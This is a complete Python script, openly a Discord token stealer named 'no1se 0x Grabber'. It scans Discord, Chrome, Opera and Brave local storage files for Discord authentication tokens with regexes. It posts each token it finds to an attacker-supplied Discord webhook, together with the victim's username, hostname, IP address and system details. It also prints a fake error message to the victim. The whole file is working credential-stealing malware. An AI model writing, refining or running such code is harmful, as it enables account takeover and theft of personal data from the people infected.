import os
import re
import requests
import json
import platform
import psutil
import socket

def send_webhook(url, token):
    data = {
        "username": "no1se 0x Grabber",
        "avatar_url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQRecNTBUQO7mj6tvPjPJZFt6W8IMCsCHNcbRkS_0P7cHiwjvjGJLIm8sdNpg4eEYzfbFM&usqp=CAU",
        "embeds": [{
            "title": "Token Found!",
            "description": f"`{token}`",
            "color": 0xFF0000,
            "footer": {
                "text": "Made By no1se"
            },
            "thumbnail": {
                "url": "https://media-cldnry.s-nbcnews.com/image/upload/newscms/2022_44/3578892/221101-obama-wisconsin-rally-an.jpg"
            }
        }]
    }
    data2 = {
    "username": "no1se 0x Grabber",
    "avatar_url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQRecNTBUQO7mj6tvPjPJZFt6W8IMCsCHNcbRkS_0P7cHiwjvjGJLIm8sdNpg4eEYzfbFM&usqp=CAU",
    "embeds": [{
        "title": "System information",
        "description": f"`{system_info,user_info,network_info,disk_usage}`",
        "color": 0x003EFF,
        "footer": {
        "text": "Made By no1se"
        },
        "thumbnail": {
        "url": "https://cdn.geekwire.com/wp-content/uploads/2016/02/12232690_10153894492949238_974293027369694485_o.jpg"
        }
        }]
    }
    data3 = {
    "username": "no1se 0x Grabber",
    "avatar_url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQRecNTBUQO7mj6tvPjPJZFt6W8IMCsCHNcbRkS_0P7cHiwjvjGJLIm8sdNpg4eEYzfbFM&usqp=CAU",
    "embeds": [{
        "title": "Please support me by opening the Linversite link: https://link-hub.net/546300/support-me",
        "color": 0x1BFF00,
        "footer": {
        "text": "Made By no1se"
        },
        "thumbnail": {
        "url": "https://media.tenor.com/NKEgEF6m3REAAAAC/linktervise-lol.gif"
        }
        }]
    }
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(url, data=json.dumps(data), headers=headers)
    response = requests.post(url, data=json.dumps(data2), headers=headers)
    response = requests.post(url, data=json.dumps(data3), headers=headers)
    if response.status_code == 204:
        print(f"Error 9QTC4RYY")

#-------------------------------------------------------------------------------------
system_info = {}
system_info['OS'] = platform.system()
system_info['OS Release'] = platform.release()
system_info['Processor'] = platform.processor()

user_info = {}
user_info['Username'] = psutil.Process().username()
user_info['Hostname'] = socket.gethostname()

network_info = {}
network_info['IP Address'] = socket.gethostbyname(socket.gethostname())

disk_usage = {}
disk_usage['Total'] = psutil.disk_usage('/').total
disk_usage['Used'] = psutil.disk_usage('/').used
disk_usage['Free'] = psutil.disk_usage('/').free
#---------------------------------------------------------------------------------------
def get_tokens():
    token_list = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default'
    }

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        for foldername in os.listdir(path + '\\Local Storage\\leveldb'):
            if not foldername.endswith('.log') and not foldername.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(path + '\\Local Storage\\leveldb\\' + foldername, errors='ignore').readlines() if x.strip()]:
                for regex in [r'mfa\.[\w-]{84}', r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}']:
                    for token in re.findall(regex, line):
                        token_list.append(token)
                        send_webhook(WEBHOOK_URL, token)

    return token_list

if __name__ == '__main__':
    WEBHOOK_URL = "WEBHOOK_URL_HERE"
    tokens = get_tokens()
